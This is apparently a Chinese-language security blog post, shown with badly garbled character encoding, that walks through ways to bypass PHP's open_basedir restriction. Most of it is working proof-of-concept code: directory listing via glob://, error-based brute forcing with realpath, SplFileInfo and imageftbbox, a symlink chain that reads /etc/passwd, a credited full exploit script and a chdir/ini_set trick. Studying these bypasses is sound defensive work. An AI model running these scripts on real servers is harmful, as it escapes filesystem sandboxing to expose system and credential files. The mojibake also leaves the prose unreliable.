è¾“å‡ºå½“å‰PHPé…ç½®ä¸­çš„open_basedirå€¼ï¼Œopen_basediré™åˆ¶è„šæœ¬åªèƒ½è®¿é—®æŒ‡å®šçš„ç›®å½•åŠå…¶å­ç›®å½•ã€‚ printf('&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;', ini_get('open_basedir')); // åˆ›å»ºä¸€ä¸ªç©ºæ•°ç»„ï¼Œç”¨äºå­˜å‚¨æ–‡ä»¶åˆ—è¡¨ã€‚ $file_list = array(); // DirectoryIteratoræ˜¯PHPçš„å†…ç½®ç±»ï¼Œå¯ä»¥ç”¨äºéå†æ–‡ä»¶å¤¹å’Œæ–‡ä»¶ // ä»£ç ä¸­ä½¿ç”¨glob:///*æ¥åˆ—å‡ºç”±globå‡½æ•°æ”¯æŒçš„æ‰€æœ‰åŒ¹é…çš„æ–‡ä»¶ã€‚ $it = new DirectoryIterator(\"glob:///*\"); // éå†DirectoryIteratorè¿”å›çš„æ¯ä¸ªæ–‡ä»¶ï¼ˆæ–‡ä»¶åï¼‰ foreach($it as $f) { // å°†æ–‡ä»¶åæ·»åŠ åˆ°$file_listæ•°ç»„ä¸­ï¼Œ$f-&gt;__toString()è¿”å›å½“å‰éå†åˆ°çš„æ–‡ä»¶çš„è·¯å¾„åã€‚ $file_list[] = $f-&gt;__toString(); } //è¿™æ¬¡æ˜¯ä¸ºäº†éå†éšè—æ–‡ä»¶ï¼ˆä»¥.å¼€å¤´çš„ç‰¹æ®Šæ–‡ä»¶ï¼‰ã€‚åŒæ ·ä¹Ÿä½¿ç”¨äº†glob://åè®®ã€‚ $it = new DirectoryIterator(\"glob:///.*\"); //åŒç† foreach($it as $f) { $file_list[] = $f-&gt;__toString(); } //è¿›è¡Œæ–‡ä»¶åçš„æ’åºï¼Œä¸ºäº†ç¾è§‚ sort($file_list); //è¾“å‡ºå¾—åˆ°çš„æ‰€æœ‰æ–‡ä»¶ foreach($file_list as $f){ echo \"{$f}&lt;br/&gt;\"; } ?&gt; è¿™é‡Œè·Ÿç€GPTå­¦ä¹ ä¸€æ³¢ä¸Šè¿°ä»£ç çš„é€»è¾‘ï¼Œè¿™é‡Œæ‡’å¾—é…ç¯å¢ƒäº†ï¼Œå°±ç›´æ¥å€Ÿç”¨pç¥çš„äº†~~~ æ‰§è¡Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œopen_basedirä¸º/usr/share/nginx/www/:/tmp/ï¼Œä½†æˆ‘ä»¬æˆåŠŸåˆ—ä¸¾äº†/æ ¹ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼š ä¸è¿‡è¿™é‡Œçš„æµ‹è¯•æ˜¯åœ¨linuxç¯å¢ƒä¸‹æ‰å¯ä»¥çš„ï¼Œå¹¶ä¸”è¿˜æœ‰ä¸€ä¸ªç¼ºç‚¹å°±æ˜¯è¦æ±‚phpç‰ˆæœ¬ä¸º5.3ä»¥ä¸Šï¼Œä½†pç¥åˆè¯´5.5/5.6å¯èƒ½æœ‰ä¿®å¤ï¼Œä½†è¿˜æ²¡çœ‹åˆ°ã€‚ã€‚ã€‚è¿™é‡Œå…ˆä¸ç®¡äº† realpathåˆ—ä¸¾ç›®å½• è¿™ä¸ªrealpathå‡½æ•°æ˜¯phpä¸­å°†ä¸€ä¸ªè·¯å¾„è§„èŒƒåŒ–æˆä¸ºç»å¯¹è·¯å¾„çš„æ–¹æ³•ï¼Œå®ƒå¯ä»¥å»æ‰å¤šä½™çš„â€¦/æˆ–./ç­‰è·³è½¬å­—ç¬¦ï¼Œèƒ½å°†ç›¸å¯¹è·¯å¾„è½¬æ¢æˆç»å¯¹è·¯å¾„ã€‚ åœ¨å¼€å¯äº†open_basedirä»¥åï¼Œè¿™ä¸ªå‡½æ•°æœ‰ä¸ªç‰¹ç‚¹ï¼šå½“æˆ‘ä»¬ä¼ å…¥çš„è·¯å¾„æ˜¯ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ï¼ˆç›®å½•ï¼‰æ—¶ï¼Œå®ƒå°†è¿”å›falseï¼›å½“æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªä¸åœ¨open_basediré‡Œçš„æ–‡ä»¶ï¼ˆç›®å½•ï¼‰ï¼Œä½†è¯¥æ–‡ä»¶ï¼ˆç›®å½•ï¼‰æ˜¯å­˜åœ¨çš„è¯ï¼Œä»–å°†æŠ›å‡ºé”™è¯¯ï¼ˆFile is not within the allowed path(s)ï¼‰ã€‚ é‚£è¿™å¾ˆæ˜æ˜¾äº†ï¼Œæˆ‘ä»¬åªéœ€è¦åˆ¤æ–­æŠ¥é”™ä¿¡æ¯ï¼Œå°±å¯ä»¥å¾—åˆ°è¯¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨äº†ï¼Œä¹Ÿå°±æ˜¯æš´åŠ›ç ´è§£ï¼Œè¿™ä¸ªé”™è¯¯ä¿¡æ¯ç”¨err_handle()å‡½æ•°æ•æ‰ï¼šå½“çŒœè§£æŸä¸ªå­˜åœ¨çš„æ–‡ä»¶æ—¶ï¼Œä¼šå› æŠ›å‡ºé”™è¯¯è€Œè¿›å…¥err_handle()ï¼Œå½“çŒœè§£æŸä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶æ—¶ï¼Œå°†ä¸ä¼šè¿›å…¥err_handle()ã€‚ ä½†ç¼ºç‚¹å°±æ˜¯æ•ˆç‡å¤ªä½ï¼Œä¸Šåƒä¸‡æ¬¡æ‰å¯ä»¥è·‘å®Œï¼Œè¿™è‚¯å®šä¸è¡Œçš„ï¼Œä½†pç¥è¿™æ—¶å€™å°±æƒ³åˆ°äº†windowsä¸‹çš„é€šé…ç¬¦ï¼š&lt;ã€&gt; è¿™é‡Œå°±æ‡µé€¼äº†ï¼Œwindowsä¸‹é€šé…ç¬¦ä¸æ˜¯?ã€*å—ï¼Œè¿™ä¸¤ä¸ªç¬¦å·æ˜¯ä»€ä¹ˆé¬¼ï¼Œéšåçœ‹åˆ°è¯„è®ºåŒºpç¥è®©æˆ‘ä»¬çœ‹çœ‹è¿™ä¸ªæ¼æ´ wooyun-2014-071540 ä¸Šè¿°æ ‡è®°å¤„ä»–æ‰“é”™äº†ï¼Œè¿™é‡Œè¯´åœ¨php+windows+iisç¯å¢ƒä¸‹è¿™ä¸¤ä¸ªç¬¦å·å¯ä»¥ç­‰ä»·äºé€šé…ç¬¦ï¼Œå—·å¼ï¼Œæ€ªä¸å¾—ï¼Œpayloadå¦‚ä¸‹ &lt;?php ini_set('open_basedir', dirname(__FILE__));//è·å–php.iniä¸­çš„open_basedirä¿¡æ¯ printf(\"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;\", ini_get('open_basedir'));//å°†å…¶éå†æ‰“å°å‡ºæ¥ set_error_handler('isexists'); $dir = 'd:/test/'; $file = ''; $chars = 'abcdefghijklmnopqrstuvwxyz0123456789_'; for ($i=0; $i &lt; strlen($chars); $i++) { $file = $dir . $chars[$i] . '&lt;&gt;&lt;'; realpath($file);//å°†æ‰€æœ‰è‡ªå®šä¹‰å¾—åˆ°çš„æ–‡ä»¶ç»å¯¹è·¯å¾„ä¼ å…¥åˆ°å…¶ä¸­ï¼Œå®ƒä¼šæ ¹æ®æ˜¯å¦å­˜åœ¨è€Œé€‰æ‹©æŠ¥é”™ä¸å¦ï¼Œç´§æ¥ç€å°±ä¼šè§¦å‘isexists } function isexists($errno, $errstr) { $regexp = '/File\\((.*)\\) is not within/';//åŒ¹é…File xxx is not withinçš„æ–‡æœ¬ preg_match($regexp, $errstr, $matches); if (isset($matches[1])) { printf(\"%s &lt;br/&gt;\", $matches[1]);//å¦‚æœåŒ¹é…åˆ°åˆ™å°†åŒ¹é…åˆ°çš„å†…å®¹æ‰“å°å‡ºæ¥ } } ?&gt; æ‰§è¡Œå¯ä»¥çœ‹åˆ°ï¼š Open_basedirä¸ºc:\\wamp\\wwwï¼Œä½†æˆ‘ä»¬åˆ—ä¸¾å‡ºäº†d:/test/ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œä¸è¿‡åªèƒ½åˆ—ä¸¾å‡ºé¦–å­—æ¯ä¸åŒçš„æ–‡ä»¶ï¼Œé¦–å­—æ¯ç›¸åŒçš„è¯ï¼Œå°±éœ€è¦æ·»åŠ ç¬¬äºŒä¸ªå­—ç¬¦å†æ¥ç€æšä¸¾ã€ç¬¬ä¸‰ä¸ªå­—ç¬¦etcâ€¦ è¿™ä¸ªæ–¹æ³•å¥½å¤„æ˜¯windowsä¸‹phpæ‰€æœ‰ç‰ˆæœ¬é€šç”¨ï¼Œå½“ç„¶åå¤„å°±æ˜¯åªæœ‰windowsä¸‹æ‰èƒ½ä½¿ç”¨é€šé…ç¬¦ï¼Œå¦‚æœæ˜¯linuxä¸‹å°±åªèƒ½æš´åŠ›çŒœè§£äº†ã€‚ SplFileInfo::getRealPathåˆ—ä¸¾ç›®å½• è¿™æ—¶pç¥åˆåœ¨æƒ³ï¼Œå¦‚æœæˆ‘ä»¬çš„realpathè¢«banäº†è¯¥å¦‚ä½•ï¼Œéšåä»–åœ¨PHP5.1.2ä¹‹åæ‰¾åˆ°äº†ä¸€ä¸ªæ–°å¼•å…¥çš„ç±»ï¼ŒSplFileInfoï¼Œå…¶æä¾›ä¸€ä¸ªå¯¹æ–‡ä»¶è¿›è¡Œæ“ä½œçš„æ¥å£ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªgetRealPathæ–¹æ³•ä¸realpathå¾ˆåƒï¼Œéƒ½æ˜¯è·å–ç»å¯¹è·¯å¾„ç”¨çš„ã€‚ä½†åŒºåˆ«ç‚¹åœ¨äºè¿™ä¸ªgetRealPathæ–¹æ³•æ˜¯å®Œå…¨æ— è§†open_basedirå­˜åœ¨çš„ï¼Œå½“æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„æ—¶ï¼Œä¼šè¿”å›falseï¼Œå½“è¯¥è·¯å¾„å­˜åœ¨æ—¶ï¼Œä»–ä¼šç›´æ¥è¿”å›æ­£å¸¸çš„ç»å¯¹è·¯å¾„ï¼Œæ¥ä¸‹æ¥çœ‹pç¥çš„pocï¼š &lt;?php ini_set('open_basedir', dirname(__FILE__)); printf(\"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;\", ini_get('open_basedir')); $basedir = 'D:/test/'; $arr = array(); $chars = 'abcdefghijklmnopqrstuvwxyz0123456789'; for ($i=0; $i &lt; strlen($chars); $i++) { $info = new SplFileInfo($basedir . $chars[$i] . '&lt;&gt;&lt;');//å°†æ„é€ çš„è·¯å¾„ä¼ å…¥è¯¥ç±»ï¼Œå¹¶å®ä¾‹åŒ– $re = $info-&gt;getRealPath();//è°ƒç”¨getrealpathæ–¹æ³•ï¼Œå°è¯•è·å–ç»å¯¹è·¯å¾„ if ($re) { dump($re);//å¦‚æœå­˜åœ¨ï¼Œåˆ™è½¬åˆ°dumpå‡½æ•°è¿›è¡Œå¤„ç† } } function dump($s){ echo $s . '&lt;br/&gt;';//è¾“å‡ºå¾—åˆ°çš„æ–‡ä»¶ç»å¯¹è·¯å¾„ ob_flush(); flush(); } ?&gt; è¿™é‡Œé™„ä¸Šå¯¹ob_flush()ä¸flush()çš„è§£é‡Šï¼š è¿™ä¸ª dump å‡½æ•°å¯èƒ½ä¸»è¦ç”¨äºè°ƒè¯•ç›®çš„ï¼Œå½“å¼€å‘è€…æƒ³è¦å¾—åˆ°å®æ—¶è¾“å‡ºå¹¶å³æ—¶è§‚å¯Ÿè„šæœ¬æ‰§è¡Œä¿¡æ¯æ—¶ã€‚åœ¨è„šæœ¬æ‰§è¡ŒæœŸé—´ï¼Œè¾“å‡ºé€šå¸¸ä¼šç¼“å­˜èµ·æ¥ï¼Œç›´åˆ°è¾¾åˆ°ä¸€å®šé‡æˆ–è„šæœ¬æ‰§è¡Œå®Œæ¯•åä¸€æ¬¡æ€§å‘é€åˆ°æµè§ˆå™¨ã€‚é€šè¿‡ä½¿ç”¨ ob_flush() å’Œ flush()ï¼Œå¼€å‘è€…å¯ä»¥å¼ºåˆ¶ç«‹å³è¾“å‡ºæ•°æ®ï¼Œè¿™å¯¹äºç›‘è§†é•¿æ—¶é—´è¿è¡Œçš„è„šæœ¬éå¸¸æœ‰ç”¨ã€‚ åŒæ ·å¯ä»¥åˆ—ä¸¾ï¼Œè¿™ä¸ªæ–¹æ³•æœ‰ä¸ªç‰¹ç‚¹ï¼Œä¸ç®¡æ˜¯å¦å¼€å¯open_basediréƒ½æ˜¯å¯ä»¥æšä¸¾ä»»æ„ç›®å½•çš„ã€‚è€Œä¸Šä¸€ä¸ªæ–¹æ³•ï¼ˆrealpathï¼‰åªæœ‰åœ¨å¼€å¯open_basedirä¸”åœ¨open_basedirå¤–çš„æ—¶å€™æ‰ä¼šæŠ¥é”™ï¼Œæ‰èƒ½åˆ—ä¸¾ç›®å½•ã€‚å½“ç„¶ï¼Œæ²¡æœ‰å¼€å¯open_basedirçš„æ—¶å€™ä¹Ÿä¸éœ€è¦è¿™æ ·åˆ—ä¸¾ç›®å½•äº†ã€‚ GDåº“imageftbbox/imagefttextåˆ—ä¸¾ç›®å½• GDåº“ä¸€èˆ¬æ˜¯PHPå¿…å¤‡çš„æ‹“å±•åº“ä¹‹ä¸€ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹pç¥çš„åˆ†æï¼š æˆ‘æ‹¿imageftbboxä¸¾ä¸ªä¾‹å­ï¼Œè¿™ä¸ªå‡½æ•°ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯å­—ä½“çš„è·¯å¾„ã€‚æˆ‘å‘ç°å½“è¿™ä¸ªå‚æ•°åœ¨open_basedirå¤–çš„æ—¶å€™ï¼Œå½“æ–‡ä»¶å­˜åœ¨ï¼Œåˆ™phpä¼šæŠ›å‡ºâ€œFile(xxxxx) is not within the allowed path(s)â€é”™è¯¯ã€‚ä½†å½“æ–‡ä»¶ä¸å­˜åœ¨çš„æ—¶å€™ä¼šæŠ›å‡ºâ€œInvalid font filenameâ€é”™è¯¯ã€‚ è¿™å¾ˆæ¸…æ™°äº†ï¼Œç‰¹ç‚¹ç±»ä¼¼äºrealpathï¼Œçœ‹pocï¼š &lt;?php ini_set('open_basedir', dirname(__FILE__)); printf(\"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;\", ini_get('open_basedir')); set_error_handler('isexists'); $dir = 'd:/test/'; $file = ''; $chars = 'abcdefghijklmnopqrstuvwxyz0123456789_'; for ($i=0; $i &lt; strlen($chars); $i++) { $file = $dir . $chars[$i] . '&lt;&gt;&lt;'; //$m = imagecreatefrompng(\"zip.png\"); //imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, 'aaa'); imageftbbox(100, 100, $file, 'aaa');//å°†æ„é€ çš„æ–‡ä»¶è·¯å¾„ä¼ ç»™imageftbboxæ–¹æ³•ï¼Œå‡ºé”™çš„è¯åˆ™ä¼šè°ƒç”¨isexistsæ–¹æ³• } function isexists($errno, $errstr) { global $file; if (stripos($errstr, 'Invalid font filename') === FALSE) { printf(\"%s&lt;br/&gt;\", $file);//å¦‚æœæŠ¥é”™ä¿¡æ¯ä¸æ˜¯Invalid font filenameçš„è¯ï¼Œåˆ™è¾“å…¥æ–‡ä»¶è·¯å¾„ } } ?&gt; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆåŠŸçˆ†å‡ºï¼Œä½†å´åªèƒ½çˆ†å‡ºä¸€ä¸ªå­—ç¬¦ï¼Œä½†æ³¨æ„çš„æ˜¯è¿™é‡Œçš„ç‰¹æ®Šé€šé…ç¬¦æ˜¯èµ·äº†ä½œç”¨çš„ï¼Œåªä¸è¿‡åœ¨æœ€ç»ˆè¾“å‡ºçš„æ—¶å€™é€šé…ç¬¦å¹¶æ²¡æœ‰è½¬æ¢ä¸ºç›¸åº”çš„å­—ç¬¦ã€‚å› æ­¤è¿™ç§æ–¹æ³•æ¯”realpathéº»çƒ¦çš„ç‚¹åœ¨äºï¼Œéœ€è¦ä¸€ä½ä¸€ä½çˆ†ç ´ã€‚ bindtextdomainæš´åŠ›çŒœè§£ç›®å½• å…ˆçœ‹pç¥çš„åˆ†æï¼š bindtextdomainæ˜¯phpä¸‹ç»‘å®šdomainåˆ°æŸä¸ªç›®å½•çš„å‡½æ•°ã€‚å…·ä½“è¿™ä¸ªdomainæ˜¯ä»€ä¹ˆæˆ‘ä¹Ÿæ²¡å…·ä½“ç”¨è¿‡ï¼Œåªæ˜¯åœ¨ä¸€äº›l10nåº”ç”¨ä¸­å¯èƒ½ç”¨åˆ°çš„æ–¹æ³•ï¼ˆç›¸å…³å‡½æ•°textdomainã€gettextã€setlocaleï¼Œè¯´æ˜ï¼šhttp://php.net/manual/en/function.gettext.phpï¼‰ Bindtextdomainå‡½æ•°åœ¨ç¯å¢ƒæ”¯æŒGettext Functionsçš„æ—¶å€™æ‰èƒ½ä½¿ç”¨ï¼Œè€Œæˆ‘çš„windowsç¯å¢ƒä¸‹æ˜¯æ²¡æœ‰bindtextdomainå‡½æ•°çš„ï¼Œæˆ‘çš„linuxç¯å¢ƒæ˜¯é»˜è®¤å­˜åœ¨è¿™ä¸ªå‡½æ•°ã€‚ è¿™ä¸ªå‡½æ•°çš„ç‰¹ç‚¹åœ¨äºç¬¬äºŒä¸ªå‚æ•°directoryï¼Œå¦‚æœæ–‡ä»¶è·¯å¾„å­˜åœ¨åˆ™è¿”å›å…·ä½“çš„è·¯å¾„ï¼Œä¸å­˜åœ¨åˆ™è¿”å›falseï¼Œpocå¦‚ä¸‹ &lt;?php printf('&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;', ini_get('open_basedir')); $re = bindtextdomain('xxx', $_GET['dir']); var_dump($re); ?&gt; è¿™é‡Œå¯ä»¥çœ‹åˆ°ä¾æ—§å¯ä»¥ç»•è¿‡open_basedirï¼Œç¼ºç‚¹åœ¨äºåªèƒ½åœ¨linuxç¯å¢ƒä¸‹æ‰å¯ä»¥ï¼Œä½†åœ¨linuxä¸‹åˆä¸èƒ½ä½¿ç”¨é€šé…ç¬¦æ¥çŒœè§£ç›®å½•ï¼Œæ‰€ä»¥è¿™æ˜¯ä¸€ä¸ªæ²¡æœ‰åŠæ³•çš„åŠæ³•ã€‚ã€‚ã€‚ã€‚ è¿™é‡Œé™„ä¸Šlinuxä¸‹åˆä¸èƒ½ä½¿ç”¨é€šé…ç¬¦æ¥çŒœè§£ç›®å½•çš„åŸå› ï¼š åœ¨Linuxç³»ç»Ÿä¸­ï¼Œé€šè¿‡æ­£å¸¸çš„shellç¯å¢ƒä¸­ä½¿ç”¨é€šé…ç¬¦ï¼ˆå¦‚ * å’Œ ?ï¼‰æ¥è¿›è¡Œæ–‡ä»¶åŒ¹é…å’Œç®€å•çš„æ¨¡å¼åŒ¹é…é€šå¸¸æ˜¯å¯è¡Œçš„ã€‚ç„¶è€Œï¼Œé€šé…ç¬¦é€šå¸¸ä¸ç”¨äºâ€œçŒœè§£â€ï¼ˆæˆ–ç§°æšä¸¾ï¼‰ç›®å½•ï¼Œå› ä¸ºshellé€šé…ç¬¦çš„åŒ¹é…è§„åˆ™å¹¶ä¸æ”¯æŒçŒœè§£ç›®å½•ç»“æ„ä¸­æœªçŸ¥çš„éƒ¨åˆ†ã€‚ ä¾‹å¦‚ï¼Œ* å¯ç”¨äºåŒ¹é…ä»»æ„æ•°é‡çš„å­—ç¬¦ï¼Œè€Œ ? å¯åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦ã€‚è¿™äº›é€šé…ç¬¦å¯ä»¥åŒ¹é…å·²çŸ¥æ¨¡å¼çš„æ–‡ä»¶å’Œç›®å½•åç§°ï¼Œä½†å®ƒä»¬æ— æ³•ç”¨æ¥å‘ç°ç³»ç»Ÿä¸ŠæœªçŸ¥æˆ–éšè—çš„ç›®å½•ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä½ ä¸èƒ½é€šè¿‡å®ƒä»¬æ¥çŒœè§£ç”±æœªçŸ¥å­—ç¬¦ç»„æˆçš„ç›®å½•åç§°ã€‚ opendir+readdir+globç»•è¿‡ opendirä½œç”¨ä¸ºæ‰“å¼€ç›®å½•å¥æŸ„ readdirä½œç”¨ä¸ºä»ç›®å½•å¥æŸ„ä¸­è¯»å–ç›®å½• è„šæœ¬å¦‚ä¸‹ï¼š &lt;?php $a = $_GET['c']; if ( $b = opendir($a) ) { while ( ($file = readdir($b)) !== false ) { echo $file.\"&lt;br&gt;\"; } closedir($b); } ?&gt; è™½ç„¶åªèƒ½åˆ—ç›®å½•ï¼Œphp7å¯ä»¥ç”¨å¦‚ä¸‹æ–¹æ³•è¯»éæ ¹ç›®å½•æ–‡ä»¶,glob:///*/www/../* å¯åˆ—ä¸¾ /varå¦‚ä¸‹å›¾ å¯è§æˆåŠŸç»•è¿‡ åˆ©ç”¨ scandir+globç»•è¿‡ scandir()å‡½æ•°å¯ä»¥åˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸­çš„æ–‡ä»¶å’Œç›®å½• åˆ©ç”¨symlinkç»•è¿‡ symlink()å‡½æ•°åˆ›å»ºä¸€ä¸ªä»æŒ‡å®šåç§°è¿æ¥çš„ç°å­˜ç›®æ ‡æ–‡ä»¶å¼€å§‹çš„ç¬¦å·è¿æ¥ã€‚ symlink(string $target, string $link): bool symlink()å¯¹äºå·²æœ‰çš„ target å»ºç«‹ä¸€ä¸ªåä¸º link çš„ç¬¦å·è¿æ¥ï¼Œè€Œtargetä¸€èˆ¬æƒ…å†µä¸‹å—é™äºopen_basedirã€‚ å®˜æ–¹çš„domo: &lt;?php $target = 'uploads.php'; $link = 'uploads'; symlink($target, $link); echo readlink($link); # å°†ä¼šè¾“å‡º'uploads.php'è¿™ä¸ªå­—ç¬¦ä¸² ?&gt; å¦‚æœå°†è¦è¯»å–/etc/passwdpocå¦‚ä¸‹ï¼Œè¿™é‡Œç”±äºæˆ‘å’Œå¸ˆå‚…çš„ç¯å¢ƒä¸ä¸€è‡´ï¼Œå°±ç›´æ¥cväº† &lt;?php mkdir(\"A\"); chdir(\"A\"); mkdir(\"B\"); chdir(\"B\"); mkdir(\"C\"); chdir(\"C\"); mkdir(\"D\"); chdir(\"D\"); chdir(\"..\"); chdir(\"..\"); chdir(\"..\"); chdir(\"..\"); symlink(\"A/B/C/D\",\"SD\"); symlink(\"SD/../../../../etc/passwd\",\"POC\"); unlink(\"SD\"); mkdir(\"SD\"); ?&gt; è®¿é—®webå,å°†ä¼šç”Ÿæˆåä¸ºPOCçš„æ–‡ä»¶ åˆ†æä¸€ä¸‹pocè¿‡ç¨‹: åˆ›å»ºA/B/C/Dç›®å½•ï¼Œå¹¶è¿”å›åˆ°èµ·å§‹ç›®å½• symlink(\"A/B/C/D\",\"SD\"):åˆ›å»ºç¬¦å·æ–‡ä»¶SDï¼ŒæŒ‡å‘A/B/C/D symlink(\"SD/../../../../etc/passwd\",\"POC\"):åˆ›å»ºç¬¦å·æ–‡ä»¶POC,æŒ‡å‘SD/../../../../etc/passwdã€‚æ­¤æ—¶SD=A/B/C/D,è€ŒA/B/C/D../../../../=/var/www/html,ç¬¦åˆopen_basedirçš„é™åˆ¶,åˆ›å»ºæˆåŠŸã€‚ unlink(â€œSDâ€):åˆ é™¤è½¯é“¾æ¥SDï¼Œå¹¶åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œæ­¤æ—¶SDä½œä¸ºä¸€ä¸ªçœŸæ­£çš„ç›®å½•å­˜åœ¨å¹¶ä¸”SDåœ¨htmlç›®å½•ä¸‹ã€‚é‚£ä¹ˆè®¿é—®POCï¼ŒæŒ‡å‘çš„æ˜¯SD/../../../../etc/passwd,SD/../../../å°±æ˜¯/varç›®å½•,/var/../etc/passwdæ°å¥½å¯ä»¥è¯»å–åˆ°etcç›®å½•ä¸‹çš„passwdï¼Œä»è€Œè¾¾åˆ°è·¨ç›®å½•è®¿é—®çš„æ•ˆæœã€‚ï¼ˆå› ä¸ºlinkæ˜¯ä¸å—open_basedirçš„é™åˆ¶ï¼‰ è¿™é‡Œéœ€è¦è·¨å‡ å±‚ç›®å½•å°±éœ€è¦åˆ›å»ºå‡ å±‚ç›®å½•ã€‚ æœ€åé™„ä¸Špç‰›EXP &lt;?php /* * by phithon * From https://www.leavesongs.com * detail: http://cxsecurity.com/issue/WLB-2009110068 */ header('content-type: text/plain'); error_reporting(-1); ini_set('display_errors', TRUE); printf(\"open_basedir: %s php_version: %s \", ini_get('open_basedir'), phpversion()); printf(\"disable_functions: %s \", ini_get('disable_functions')); $file = str_replace('\\\\', '/', isset($_REQUEST['file']) ? $_REQUEST['file'] : '/etc/passwd'); $relat_file = getRelativePath(__FILE__, $file); $paths = explode('/', $file); $name = mt_rand() % 999; $exp = getRandStr(); mkdir($name); chdir($name); for($i = 1 ; $i &lt; count($paths) - 1 ; $i++){ mkdir($paths[$i]); chdir($paths[$i]); } mkdir($paths[$i]); for ($i -= 1; $i &gt; 0; $i--) { chdir('..'); } $paths = explode('/', $relat_file); $j = 0; for ($i = 0; $paths[$i] == '..'; $i++) { mkdir($name); chdir($name); $j++; } for ($i = 0; $i &lt;= $j; $i++) { chdir('..'); } $tmp = array_fill(0, $j + 1, $name); symlink(implode('/', $tmp), 'tmplink'); $tmp = array_fill(0, $j, '..'); symlink('tmplink/' . implode('/', $tmp) . $file, $exp); unlink('tmplink'); mkdir('tmplink'); delfile($name); $exp = dirname($_SERVER['SCRIPT_NAME']) . \"/{$exp}\"; $exp = \"http://{$_SERVER['SERVER_NAME']}{$exp}\"; echo \" -----------------content--------------- \"; echo file_get_contents($exp); delfile('tmplink'); function getRelativePath($from, $to) { // some compatibility fixes for Windows paths $from = rtrim($from, '\\/') . '/'; $from = str_replace('\\\\', '/', $from); $to = str_replace('\\\\', '/', $to); $from = explode('/', $from); $to = explode('/', $to); $relPath = $to; foreach($from as $depth =&gt; $dir) { // find first non-matching dir if($dir === $to[$depth]) { // ignore this directory array_shift($relPath); } else { // get number of remaining dirs to $from $remaining = count($from) - $depth; if($remaining &gt; 1) { // add traversals up to first matching dir $padLength = (count($relPath) + $remaining - 1) * -1; $relPath = array_pad($relPath, $padLength, '..'); break; } else { $relPath[0] = './' . $relPath[0]; } } } return implode('/', $relPath); } function delfile($deldir){ if (@is_file($deldir)) { @chmod($deldir,0777); return @unlink($deldir); }else if(@is_dir($deldir)){ if(($mydir = @opendir($deldir)) == NULL) return false; while(false !== ($file = @readdir($mydir))) { $name = File_Str($deldir.'/'.$file); if(($file!='.') &amp;&amp; ($file!='..')){delfile($name);} } @closedir($mydir); @chmod($deldir,0777); return @rmdir($deldir) ? true : false; } } function File_Str($string) { return str_replace('//','/',str_replace('\\\\','/',$string)); } function getRandStr($length = 6) { $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $randStr = ''; for ($i = 0; $i &lt; $length; $i++) { $randStr .= substr($chars, mt_rand(0, strlen($chars) - 1), 1); } return $randStr; } åˆ©ç”¨chdirä¸ini_setç»•è¿‡ chdirå°†å·¥ä½œç›®å½•åˆ‡æ¢åˆ°æŒ‡å®šçš„ç›®å½•,å‡½æ•°åŸå‹ä¸º chdir(string $directory): bool ini_setiç”¨æ¥è®¾ç½®php.iniçš„å€¼ï¼Œæ— éœ€æ‰“å¼€php.iniæ–‡ä»¶ï¼Œå°±èƒ½ä¿®æ”¹é…ç½®ã€‚å‡½æ•°åŸå‹ä¸º: ini_set(string $option, string $value): string|false è®¾ç½®æŒ‡å®šé…ç½®é€‰é¡¹çš„å€¼ã€‚è¿™ä¸ªé€‰é¡¹ä¼šåœ¨è„šæœ¬è¿è¡Œæ—¶ä¿æŒæ–°çš„å€¼ï¼Œå¹¶åœ¨è„šæœ¬ç»“æŸæ—¶æ¢å¤ã€‚ bypassåŸç†å¤§æ¦‚open_basedirè®¾è®¡é€»è¾‘çš„å®‰å…¨é—®é¢˜ï¼Œåˆ†æè¿‡ç¨‹å‚è€ƒ:ä»PHPåº•å±‚çœ‹open_basedir bypass è¿™é‡Œçœ‹äº†æ–‡ç« å‘ç°æ˜¯æ·±å…¥PHPåº•å±‚çš„ï¼Œå’±è¿™ä¹Ÿçœ‹ä¸æ‡‚ã€‚ã€‚ã€‚åªèƒ½æ€»ç»“ä¸€ä¸‹æ¼æ´ç‚¹ï¼Œé—®é¢˜æ˜¯å‡ºç°åœ¨expand_filepath()å‡½æ•°ä¸Šï¼Œè¿™ä¸ªå‡½æ•°åœ¨å¤„ç†è·¯å¾„å˜åŒ–æ—¶ï¼Œåªå…³æ³¨ç»å¯¹è·¯å¾„ï¼Œä½†æ²¡æœ‰è€ƒè™‘open_basedirä¸ºç›¸å¯¹è·¯å¾„æ—¶ä¼šå˜åŒ–çš„é—®é¢˜ï¼Œæ„é€ æ€è·¯å¦‚ä¸‹ é¦–å…ˆéœ€è¦æ„é€ ä¸€ä¸ªç›¸å¯¹å¯ä¸Šè·³çš„open_basedir mkdir('sky'); chdir('sky'); ini_set('open_basedir','..'); è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆè¦å…ˆåˆ›æ–‡ä»¶å¤¹çš„åŸå› ï¼Œå°±æ˜¯ä¸ºäº†åœ¨å½“å‰ç›®å½•æ„é€ å¯ä»¥..çš„ini_setï¼Œç„¶åæ¯æ¬¡ç›®å½•æ“ä½œ chdir('..'); 